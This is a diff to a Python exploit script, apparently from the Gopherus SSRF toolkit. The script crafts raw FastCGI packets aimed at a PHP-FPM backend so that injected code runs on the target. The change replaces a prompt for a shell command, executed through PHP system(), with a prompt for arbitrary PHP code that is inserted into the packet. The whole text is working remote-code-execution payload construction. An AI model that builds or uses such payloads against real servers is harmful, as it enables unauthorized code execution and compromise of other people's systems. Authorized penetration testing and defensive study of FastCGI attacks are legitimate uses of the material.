@@ -6,8 +6,8 @@ def FastCGI():
     if(not filename):
         filename="/usr/share/php/PEAR.php"
 
-    command=raw_input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
-    length=len(command)+52
+    phpcode=raw_input("\033[96m" +"PHP code to run:  "+ "\033[0m")
+    length=len(phpcode)+43
     char=chr(length)
 
     data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e" + chr(len(str(length)))
@@ -19,7 +19,7 @@ def FastCGI():
     temp3 = chr(len(data) % 8)
 
     end = str("\x00"*(len(data)%8)) + "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char + "\x04\x00"
-    end += "<?php system('" + command + "');die('-----Made-by-SpyD3r-----\n');?>\x00\x00\x00\x00"
+    end += "<?php " + phpcode + ";die('-----Made-by-SpyD3r-----\n');?>\x00\x00\x00\x00"
 
     start = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01" + temp1 + temp2 + temp3 + "\x00"
 
